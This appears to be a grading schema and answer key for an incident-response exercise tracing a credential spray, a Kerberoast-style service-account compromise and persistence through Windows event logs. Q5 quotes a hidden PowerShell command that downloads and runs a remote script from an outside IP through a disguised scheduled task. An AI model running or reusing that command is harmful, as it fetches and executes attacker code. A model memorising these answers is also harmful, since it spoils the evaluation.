# Grading Schema — credential-spray-domain-compromise

Total: 100. Applied per the process in this directory's `AGENTS.md`.

## Q1 — Credential spray + compromise (15 pts)
**Expected:** Targeted accounts: `mark.chen`, `elena.popov`,
`diane.foster` — all Event ID 4625, Logon Type 3, source
`185.220.101.44`, `2024-09-09 15:05:42`-`15:09:42` UTC. Success:
`diane.foster` only, Event ID 4624 (Logon Type 3), same source,
`15:15:52` UTC — a separate event from the three failures.
**Full credit:** All three targeted accounts named, correct source IP,
and the successful account/event correctly distinguished from the
failed attempts (not just "diane.foster's spray attempt" — it's a
distinct logon record).
**Partial:** Names the right accounts but conflates the failed 4625 and
successful 4624 as the same event, or misses one targeted account.
**Zero:** Wrong account credited with success, or wrong source IP.

## Q2 — The distinguishing 4648 event (20 pts)
**Expected:** The event at `2024-09-09 15:26:35` UTC —
`SubjectUserName: diane.foster`, process
`powershell.exe`, target `svc-sql` on `DC-01`. Distinguishing factors:
subject account (`diane.foster`, not `SYSTEM`) and process
(`powershell.exe`, not `taskhostw.exe`/`ops-agent.exe`) — not event
rarity; several other 4648 events targeting `svc-sql` exist and are
legitimate (see `BRIEFING.md`/`data/ENVIRONMENT.md`).
**Full credit:** Correctly identifies the specific event AND explains
the distinction using subject account and/or process — not just "this
one looked different."
**Partial:** Identifies the correct event but justifies it only vaguely
(e.g., "this one seemed suspicious") without citing the subject/process
distinction.
**Zero:** Flags a `SYSTEM`/`taskhostw.exe`/`ops-agent.exe` event as the
anomaly (these are legitimate, per `ENVIRONMENT.md` — flagging them is
a false positive), or claims the Q2 event is the *only* 4648 for
`svc-sql` in the data (it isn't — an answer built on that false premise
should not receive full credit even if it lands on the right event).

## Q3 — The time gap (15 pts)
**Expected (revised in v1.1 — see `BRIEFING.md`'s Stage 6):** `svc-sql`
actually logs on twice within the same 4 seconds: a local logon (Event
ID 4624, Logon Type 2, `WS-DFOSTER-01`, `2024-09-10 10:40:02`) followed
immediately by the RDP logon onto `DC-01` (Logon Type 10,
`10:40:06`). **Either is an acceptable answer to "the next time
svc-sql logs on"** — both give a gap of ~19h13m from the `15:26:35`
credential-request event (19h13m27s using the local logon, 19h13m31s
using the RDP one). Meaningful because a real admin action using
`svc-sql` interactively would show the credential request and the
actual logon close together in time; a multi-hour gap with no interim
`svc-sql` activity is consistent with offline ticket-cracking, not
ordinary same-session privilege use.
**Full credit:** Correct gap (within ~30 min, either reference event
accepted), with reasoning tying the gap length to offline cracking
rather than just noting "time passed."
**Partial:** Correct gap, no reasoning for why it matters.
**Zero:** Gap wildly wrong, or no gap identified.

## Q4 — svc-sql's logon (15 pts)
**Expected (revised in v1.1 — see `BRIEFING.md`'s Stage 6):** Either of
the two chained events is fully acceptable: (a) Event ID 4624, Logon
Type 2, on `WS-DFOSTER-01` itself (no `IpAddress` populated — normal for
a local logon), `10:40:02`; or (b) Event ID 4624, Logon Type 10, on
`DC-01`, source `10.55.10.21` (`WS-DFOSTER-01`'s own IP), `10:40:06`.
Both indicate the same thing: the attacker pivoted from the
already-compromised workstation directly to the DC using the cracked
credential, rather than re-authenticating from outside — (a) shows the
credential being used locally first, (b) shows the resulting remote
session landing on the DC.
**Full credit:** Correct Event ID/Logon Type for either event, and
correctly ties it back to `WS-DFOSTER-01` as the pivot point (whether
via the local-logon host itself or the RDP source IP) — not a
new/unrelated/external source.
**Partial:** Correct event but doesn't connect it back to the
already-compromised workstation from Q1-Q2.
**Zero:** Wrong Logon Type for both events, or a source unconnected to
`WS-DFOSTER-01`.

## Q5 — Persistence (15 pts)
**Expected:** Event ID 4698, `TaskName: WindowsDefenderUpdateCheck`,
subject `svc-sql`, action content:
`powershell.exe -WindowStyle Hidden -Command IEX (New-Object
Net.WebClient).DownloadString('http://45.83.221.30/upd.ps1')`
**Full credit:** Correct event, task name, AND the actual malicious
command content quoted or accurately paraphrased (not just "a
scheduled task was created").
**Partial:** Correct event and task name, doesn't cite the actual
payload content.
**Zero:** Wrong event type, or names a different persistence mechanism
not evidenced in this data.

## Q6 — Synthesis: two different accounts (20 pts)
**Expected:** Six ordered stages (spray → compromise → recon →
Kerberoast-consistent request → gap → domain logon → persistence,
condensed as appropriate) each with a citation. Explicit statement:
`diane.foster` = how the attacker got in (initial access only, an
ordinary employee account); `svc-sql` = what was ultimately
compromised (Domain Admins-equivalent, where all lasting persistence
lives) — and these are different accounts, not the same one wearing two
hats.
**Full credit:** Correctly ordered stages with citations, AND explicitly
distinguishes the two accounts' roles as asked.
**Partial:** Correct stage ordering/citations but doesn't explicitly
separate the two accounts' roles, or describes `diane.foster` as having
achieved the domain compromise herself.
**Zero:** Stages significantly out of order, missing citations
throughout, or the two-account distinction is entirely absent/wrong.
